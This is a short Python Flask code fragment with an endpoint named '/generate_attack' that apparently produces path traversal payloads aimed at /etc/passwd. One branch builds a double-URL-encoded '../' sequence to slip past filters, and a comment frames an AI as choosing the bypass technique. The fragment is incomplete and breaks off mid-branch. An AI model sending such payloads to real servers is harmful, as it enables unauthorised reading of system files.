@app.route('/generate_attack', methods=['GET'])
def generate_attack():
    target_path = "/etc/passwd"
    
    # The AI "decides" which bypass to try
    technique = random.choice(encodings)
    
    if technique == "url_double":
        payload = "%252e%252e%252f" + target_path # Double encoded ../
